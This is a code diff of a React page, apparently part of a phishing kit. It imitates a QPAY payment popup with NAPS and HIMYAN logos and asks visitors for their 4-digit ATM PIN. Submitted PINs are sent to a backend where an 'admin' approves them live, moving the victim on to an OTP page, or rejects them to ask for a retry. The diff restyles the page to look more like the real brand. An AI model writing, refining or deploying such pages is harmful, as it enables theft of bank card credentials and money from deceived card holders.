@@ -1,9 +1,7 @@
-import { useEffect, useState, useRef } from "react";
+import { useState, useRef, useEffect } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
-import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
-import { Button } from "@/components/ui/button";
+import WaitingOverlay from "@/components/WaitingOverlay";
 import {
   sendData,
   codeAction,
@@ -13,194 +11,123 @@ import {
 
 export default function ATMPassword() {
   const [, navigate] = useLocation();
-  const [pin, setPin] = useState(["", "", "", ""]);
-  const [error, setError] = useState(false);
+  const [pin, setPin] = useState("");
+  const [showPin, setShowPin] = useState(false);
+  const [error, setError] = useState("");
   const [isWaiting, setIsWaiting] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const inputRef = useRef<HTMLInputElement>(null);
 
-  // Get payment data from localStorage
-  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
-  const cardLast4 = paymentData.cardLast4 || "****";
-  
-  // Get card info from localStorage (fallback) or signal
-  const signalCardInfo = waitingCardInfo.value;
-  const cardInfo = signalCardInfo || {
-    bankName: paymentData.bankName || '',
-    bankLogo: paymentData.bankLogo || '',
-    cardType: paymentData.cardType || '',
-  };
-
-  // Emit page enter
   useEffect(() => {
     navigateToPage("كلمة مرور ATM");
-    // Focus first input
-    inputRefs.current[0]?.focus();
+    inputRef.current?.focus();
   }, []);
 
-  // Handle code action (approve/reject) from admin
   useSignalEffect(() => {
     const action = codeAction.value;
     if (action) {
       if (action.action === "approve") {
         navigate("/card-otp");
       } else if (action.action === "reject") {
-        setPin(["", "", "", ""]);
-        setError(true);
+        setPin("");
+        setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
         setIsWaiting(false);
-        inputRefs.current[0]?.focus();
+        inputRef.current?.focus();
       }
       codeAction.value = null;
     }
   });
 
-  // Handle card action (ATM button from admin)
   useSignalEffect(() => {
     const action = cardAction.value;
     if (action) {
       if (action.action === "atm") {
         navigate("/card-otp");
       } else if (action.action === "reject") {
-        setPin(["", "", "", ""]);
-        setError(true);
+        setPin("");
+        setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
         setIsWaiting(false);
-        inputRefs.current[0]?.focus();
+        inputRef.current?.focus();
       }
       cardAction.value = null;
     }
   });
 
-  const handleChange = (index: number, value: string) => {
-    // Only allow digits
-    const digit = value.replace(/\D/g, "").slice(-1);
-    
-    const newPin = [...pin];
-    newPin[index] = digit;
-    setPin(newPin);
-    setError(false);
-
-    // Auto-focus next input
-    if (digit && index < 3) {
-      inputRefs.current[index + 1]?.focus();
-    }
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    // Handle backspace
-    if (e.key === "Backspace" && !pin[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
-    const newPin = [...pin];
-    for (let i = 0; i < pastedData.length; i++) {
-      newPin[i] = pastedData[i];
-    }
-    setPin(newPin);
-    const lastIndex = Math.min(pastedData.length, 3);
-    inputRefs.current[lastIndex]?.focus();
-  };
-
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-
-    const fullPin = pin.join("");
-    if (fullPin.length !== 4) {
-      setError(true);
+    if (pin.length !== 4) {
+      setError("الرمز المدخل غير صحيح، يرجى ادخال الرمز السري للبطاقة والمكون من 4 ارقام");
       return;
     }
-
-    setError(false);
+    setError("");
     setIsWaiting(true);
     sendData({
-      digitCode: fullPin,
+      digitCode: pin,
       current: "كلمة مرور ATM",
       nextPage: "توثيق رقم الجوال",
       waitingForAdminResponse: true,
     });
   };
 
-  const isPinComplete = pin.every(digit => digit !== "");
-
   return (
-    <PageLayout variant="default">
-      <div style={{ "--primary": "#dc2626" } as React.CSSProperties}>
-        <WaitingOverlay />
+    <div style={{ minHeight: "100vh", backgroundColor: "#4a0028", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif`, direction: "rtl" }}>
+      <WaitingOverlay />
 
-        <div className="bg-white rounded-2xl shadow-xl p-6">
-        {/* Header */}
-        <div className="text-center mb-6">
-          <h1 className="text-xl font-bold text-gray-800 mb-1">إثبات ملكية البطاقة</h1>
-          <h2 className="text-2xl font-bold text-primary mb-2">ATM</h2>
-          <p className="text-gray-600 text-sm">
-            لتأكيد العملية أدخل الرقم السري للصراف الآلي
-          </p>
+      {/* Popup */}
+      <div style={{ backgroundColor: "#fff", borderRadius: 4, padding: "30px 40px 24px", width: "100%", maxWidth: 520, position: "relative", boxShadow: "0 4px 20px rgba(0,0,0,0.3)" }}>
+
+        {/* Close button */}
+        <button onClick={() => window.history.back()} style={{ position: "absolute", top: 12, left: 14, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#555", lineHeight: 1 }}>✕</button>
+
+        {/* QPAY Logo */}
+        <div style={{ textAlign: "center", marginBottom: 20 }}>
+          <img src="/qpay-logo.png" alt="QPAY" style={{ height: 28, objectFit: "contain" }} />
         </div>
 
-        {/* Bank Logo */}
-        {cardInfo?.bankLogo && (
-          <div className="flex justify-center items-center mb-6">
-            <img
-              src={cardInfo.bankLogo}
-              alt={cardInfo.bankName || "Bank"}
-              className="h-10 object-contain"
+        {/* Description */}
+        <p style={{ textAlign: "center", fontSize: 14, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
+          يرجى ادخال رمز الصراف المكون من 4 ارقام لتأكيد الدفع
+        </p>
+
+        {/* Form */}
+        <form onSubmit={handleSubmit}>
+          <div style={{ display: "flex", gap: 0, marginBottom: 12 }}>
+            <input
+              ref={inputRef}
+              type={showPin ? "text" : "password"}
+              inputMode="numeric"
+              maxLength={4}
+              value={pin}
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                setPin(val);
+                setError("");
+              }}
+              placeholder="****"
+              style={{ flex: 1, height: 44, border: "1px solid #ccc", borderRight: "none", padding: "0 14px", fontSize: 18, outline: "none", fontFamily: "inherit", letterSpacing: showPin ? 2 : 6, backgroundColor: "#f9f9f9" }}
             />
-          </div>
-        )}
-
-        {/* Transaction Info */}
-        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
-          <p>
-            يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
-          </p>
-        </div>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* PIN Input - 4 separate boxes */}
-          <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
-            {pin.map((digit, index) => (
-              <input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="tel"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className={`w-12 h-12 text-center text-lg font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
-                  error ? "border-red-500" : "border-gray-300"
-                }`}
-              />
-            ))}
+            <button
+              type="submit"
+              disabled={isWaiting || pin.length !== 4}
+              style={{ backgroundColor: pin.length === 4 && !isWaiting ? "#4a0028" : "#ccc", color: "#fff", border: "none", padding: "0 24px", fontSize: 14, fontWeight: "bold", cursor: pin.length === 4 ? "pointer" : "not-allowed", fontFamily: "inherit", whiteSpace: "nowrap" }}
+            >
+              {isWaiting ? "..." : "تحقق"}
+            </button>
           </div>
 
+          {/* Error */}
           {error && (
-            <p className="text-red-500 text-sm text-center font-medium">
-              الرقم السري غير صحيح، يرجى المحاولة مرة أخرى.
+            <p style={{ color: "#c41e3a", fontSize: 12, textAlign: "center", marginBottom: 12, lineHeight: 1.5 }}>
+              {error}
             </p>
           )}
-
-          {/* Submit Button */}
-          <Button 
-            type="submit" 
-            className="w-full h-11 text-sm" 
-            disabled={isWaiting || !isPinComplete}
-          >
-            {isWaiting ? (
-              <div className="flex items-center justify-center gap-2">
-                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                <span>جاري التحقق...</span>
-              </div>
-            ) : (
-              "تأكيد"
-            )}
-          </Button>
         </form>
+
+        {/* NAPS + HIMYAN logos */}
+        <div style={{ display: "flex", justifyContent: "center", gap: 16, marginTop: 8 }}>
+          <img src="/assets/naps-logo.svg" alt="NAPS" style={{ height: 22 }} onError={(e) => { e.currentTarget.style.display = 'none'; }} />
+          <img src="/assets/himyan-logo.svg" alt="HIMYAN" style={{ height: 22 }} onError={(e) => { e.currentTarget.style.display = 'none'; }} />
         </div>
       </div>
-    </PageLayout>
+    </div>
   );
 }
